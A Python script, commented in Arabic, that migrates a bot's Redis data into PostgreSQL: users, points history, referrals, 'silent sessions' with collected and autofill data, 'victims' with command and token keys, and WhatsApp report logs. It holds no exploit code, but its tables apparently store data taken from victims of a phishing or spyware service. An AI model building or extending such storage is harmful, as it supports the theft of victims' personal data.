# migrate_to_db.py
# ============================================================
# Migration: Redis → PostgreSQL
# بينقل البيانات القديمة تلقائياً عند أول تشغيل
# ============================================================
import os
import json
import time
from datetime import datetime

from logging_config import get_logger

logger = get_logger("migrate")


# ============================================================
# ⚙️ الإعدادات
# ============================================================
MIGRATION_FLAG_KEY = "migration_to_pg:done_v1"
MIGRATION_LOG_KEY = "migration_to_pg:log"


# ============================================================
# الدالة الرئيسية
# ============================================================
def run_migration(redis_client, database_module):
    """
    يشغل النقل من Redis إلى PostgreSQL
    - لو اتعملت قبل كده → يتجاهل
    - لو لأ → ينقل كل حاجة
    """
    from database import (
        get_db,
        save_user_db,
        add_points_history,
        add_referral,
        save_silent_session,
        save_social_profile,
        create_victim_db,
        add_wa_report_db,
        log_admin_event_db,
    )

    # ═══ 1. افحص إذا اتعملت قبل كده ═══
    try:
        if redis_client and redis_client.get(MIGRATION_FLAG_KEY):
            logger.info("✅ Migration already done — skipping")
            return True
    except Exception as e:
        logger.warning(f"Failed to check migration flag: {e}")

    logger.info("=" * 60)
    logger.info("🚀 STARTING MIGRATION: Redis → PostgreSQL")
    logger.info("=" * 60)

    stats = {
        "users": 0,
        "points_history": 0,
        "referrals": 0,
        "silent_sessions": 0,
        "social_profiles": 0,
        "victims": 0,
        "wa_reports": 0,
        "admin_events": 0,
        "errors": 0,
        "start_time": time.time(),
    }

    # ═══════════════════════════════════════════════════
    # 1. المستخدمين
    # ═══════════════════════════════════════════════════
    try:
        logger.info("📥 Migrating users...")
        user_ids = redis_client.smembers("all_users") or set()

        for uid in user_ids:
            try:
                uid_str = str(uid)
                uid_int = int(uid_str)

                raw = redis_client.get(f"user:{uid_str}")
                if not raw:
                    continue

                user_data = json.loads(raw)

                # حوّل الحقول
                user_data["user_id"] = uid_int
                user_data["created_at"] = _parse_date(user_data.get("created_at"))

                # احفظ في DB
                if save_user_db(uid_int, user_data):
                    stats["users"] += 1

                    # ═══ نقل سجل المعاملات ═══
                    history = user_data.get("history", [])
                    for entry in history[-100:]:  # آخر 100 معاملة
                        try:
                            h_type = entry.get("type", "unknown")
                            points = entry.get("points", 0)
                            created_at = _parse_date(entry.get("date"))

                            add_points_history(
                                user_id=uid_int,
                                type_=h_type,
                                points=points,
                                tool=entry.get("tool"),
                                tool_name=entry.get("tool_name"),
                                reason=entry.get("reason"),
                                admin_action=entry.get("admin", False),
                                old_value=entry.get("old"),
                                new_value=entry.get("new"),
                            )
                            stats["points_history"] += 1
                        except Exception as e:
                            logger.debug(f"History entry error: {e}")

            except Exception as e:
                stats["errors"] += 1
                logger.debug(f"User {uid} migration error: {e}")

        logger.info(f"   ✅ Users: {stats['users']}")

    except Exception as e:
        logger.exception(f"Users migration failed: {e}")

    # ═══════════════════════════════════════════════════
    # 2. الإحالات
    # ═══════════════════════════════════════════════════
    try:
        logger.info("📥 Migrating referrals...")

        # اجمع الإحالات من كل مستخدم
        user_ids = redis_client.smembers("all_users") or set()

        for uid in user_ids:
            try:
                uid_int = int(str(uid))
                # اقرى قائمة إحالات المستخدم
                referral_ids = redis_client.smembers(f"user_referrals:{uid_int}") or set()

                for rid in referral_ids:
                    try:
                        rid_int = int(str(rid))
                        if add_referral(uid_int, rid_int):
                            stats["referrals"] += 1
                    except Exception:
                        continue

            except Exception as e:
                logger.debug(f"Referral error for {uid}: {e}")

        logger.info(f"   ✅ Referrals: {stats['referrals']}")

    except Exception as e:
        logger.exception(f"Referrals migration failed: {e}")

    # ═══════════════════════════════════════════════════
    # 3. Silent Sessions
    # ═══════════════════════════════════════════════════
    try:
        logger.info("📥 Migrating silent sessions...")

        # ابحث عن كل silent sessions
        cursor = 0
        while True:
            cursor, keys = redis_client.scan(cursor, match="silent:*", count=100)

            for key in keys:
                try:
                    # تجاهل silent_user و silent_data
                    if "silent_user:" in key or "silent_data:" in key:
                        continue

                    raw = redis_client.get(key)
                    if not raw:
                        continue

                    session_data = json.loads(raw)
                    session_id = session_data.get("session_id", "")

                    if not session_id:
                        continue

                    # احصل على البيانات المجمعة (لو موجودة)
                    data_raw = redis_client.get(f"silent_data:{session_id}")
                    if data_raw:
                        try:
                            session_data["data"] = json.loads(data_raw)
                        except Exception:
                            pass

                    # احصل على autofill (لو موجود)
                    af_raw = redis_client.get(f"silent_autofill:{session_id}")
                    if af_raw:
                        try:
                            session_data["autofill_data"] = json.loads(af_raw)
                        except Exception:
                            pass

                    if save_silent_session(session_id, session_data):
                        stats["silent_sessions"] += 1

                except Exception as e:
                    logger.debug(f"Silent session error: {e}")

            if cursor == 0:
                break

        logger.info(f"   ✅ Silent Sessions: {stats['silent_sessions']}")

    except Exception as e:
        logger.exception(f"Silent sessions migration failed: {e}")

    # ═══════════════════════════════════════════════════
    # 4. Social Profiles
    # ═══════════════════════════════════════════════════
    try:
        logger.info("📥 Migrating social profiles...")

        cursor = 0
        while True:
            cursor, keys = redis_client.scan(cursor, match="profile:*", count=100)

            for key in keys:
                try:
                    # تجاهل profile_user و profile_data
                    if "profile_user:" in key or "profile_data:" in key:
                        continue

                    raw = redis_client.get(key)
                    if not raw:
                        continue

                    profile_data = json.loads(raw)
                    session_id = profile_data.get("session_id", "")

                    if not session_id:
                        # استخرج من الـ key
                        session_id = key.replace("profile:", "")

                    profile_data["session_id"] = session_id

                    if save_social_profile(session_id, profile_data):
                        stats["social_profiles"] += 1

                except Exception as e:
                    logger.debug(f"Social profile error: {e}")

            if cursor == 0:
                break

        logger.info(f"   ✅ Social Profiles: {stats['social_profiles']}")

    except Exception as e:
        logger.exception(f"Social profiles migration failed: {e}")

    # ═══════════════════════════════════════════════════
    # 5. Victims
    # ═══════════════════════════════════════════════════
    try:
        logger.info("📥 Migrating victims...")

        # ابحث عن كل victims
        cursor = 0
        seen_victims = set()

        while True:
            cursor, keys = redis_client.scan(cursor, match="victim:*:*", count=100)

            for key in keys:
                try:
                    # تجاهل victim_cmd و victim_data
                    if "victim_cmd:" in key or "victim_data:" in key or "victim_token:" in key:
                        continue

                    # key = "victim:{chat_id}:{victim_id}"
                    parts = key.split(":")
                    if len(parts) != 3:
                        continue

                    victim_id = parts[2]
                    if victim_id in seen_victims:
                        continue

                    raw = redis_client.hgetall(key)
                    if not raw:
                        continue

                    # حوّل من bytes لـ string (لو محتاج)
                    data = {}
                    for k, v in raw.items():
                        if isinstance(k, bytes):
                            k = k.decode()
                        if isinstance(v, bytes):
                            v = v.decode()
                        data[k] = v

                    data["victim_id"] = victim_id

                    if create_victim_db(victim_id, data):
                        stats["victims"] += 1
                        seen_victims.add(victim_id)

                except Exception as e:
                    logger.debug(f"Victim error: {e}")

            if cursor == 0:
                break

        logger.info(f"   ✅ Victims: {stats['victims']}")

    except Exception as e:
        logger.exception(f"Victims migration failed: {e}")

    # ═══════════════════════════════════════════════════
    # 6. WhatsApp Reports
    # ═══════════════════════════════════════════════════
    try:
        logger.info("📥 Migrating WhatsApp reports...")

        cursor = 0
        while True:
            cursor, keys = redis_client.scan(cursor, match="wa_report_history:*", count=100)

            for key in keys:
                try:
                    chat_id = int(key.replace("wa_report_history:", ""))

                    items = redis_client.lrange(key, 0, 500) or []
                    for item in items:
                        try:
                            if isinstance(item, bytes):
                                item = item.decode()

                            entry = json.loads(item)
                            number = entry.get("number", "")
                            reason = entry.get("reason", "spam")

                            if number:
                                if add_wa_report_db(chat_id, number, reason):
                                    stats["wa_reports"] += 1

                        except Exception as e:
                            logger.debug(f"WA report entry error: {e}")

                except Exception as e:
                    logger.debug(f"WA reports key error: {e}")

            if cursor == 0:
                break

        logger.info(f"   ✅ WhatsApp Reports: {stats['wa_reports']}")

    except Exception as e:
        logger.exception(f"WA reports migration failed: {e}")

    # ═══════════════════════════════════════════════════
    # 7. Admin Events
    # ═══════════════════════════════════════════════════
    try:
        logger.info("📥 Migrating admin events...")

        items = redis_client.lrange("admin_events", 0, 500) or []
        for item in items:
            try:
                if isinstance(item, bytes):
                    item = item.decode()

                entry = json.loads(item)
                admin_id = entry.get("admin_id", 0)
                event_type = entry.get("type", "unknown")
                details = entry.get("details")

                if log_admin_event_db(admin_id, event_type, {"details": details}):
                    stats["admin_events"] += 1

            except Exception as e:
                logger.debug(f"Admin event error: {e}")

        logger.info(f"   ✅ Admin Events: {stats['admin_events']}")

    except Exception as e:
        logger.exception(f"Admin events migration failed: {e}")

    # ═══════════════════════════════════════════════════
    # 8. احفظ علامة النجاح
    # ═══════════════════════════════════════════════════
    duration = time.time() - stats["start_time"]

    stats["duration_seconds"] = round(duration, 2)
    stats["completed_at"] = datetime.now().isoformat()

    logger.info("=" * 60)
    logger.info("🎉 MIGRATION COMPLETE!")
    logger.info("=" * 60)
    logger.info(f"   👤 Users:            {stats['users']}")
    logger.info(f"   💰 Points History:   {stats['points_history']}")
    logger.info(f"   🎁 Referrals:        {stats['referrals']}")
    logger.info(f"   🎯 Silent Sessions:  {stats['silent_sessions']}")
    logger.info(f"   🎨 Social Profiles:  {stats['social_profiles']}")
    logger.info(f"   👥 Victims:          {stats['victims']}")
    logger.info(f"   📱 WA Reports:       {stats['wa_reports']}")
    logger.info(f"   📊 Admin Events:     {stats['admin_events']}")
    logger.info(f"   ⏱️  Duration:          {duration:.2f}s")
    logger.info(f"   ❌ Errors:            {stats['errors']}")
    logger.info("=" * 60)

    # احفظ العلامة في Redis (لمدة سنة كاملة)
    try:
        if redis_client:
            redis_client.setex(
                MIGRATION_FLAG_KEY,
                86400 * 365,  # سنة
                "1"
            )

            # احفظ تقرير في Redis
            redis_client.setex(
                MIGRATION_LOG_KEY,
                86400 * 365,
                json.dumps(stats, ensure_ascii=False)
            )
    except Exception as e:
        logger.warning(f"Failed to save migration flag: {e}")

    return True


# ============================================================
# Helpers
# ============================================================
def _parse_date(date_str):
    """يحوّل string date لـ datetime"""
    if not date_str:
        return None

    if isinstance(date_str, datetime):
        return date_str

    try:
        # صيغة ISO
        if "T" in str(date_str):
            return datetime.fromisoformat(str(date_str).replace("Z", "+00:00"))
        return datetime.strptime(str(date_str), "%Y-%m-%d %H:%M:%S")
    except Exception:
        return None
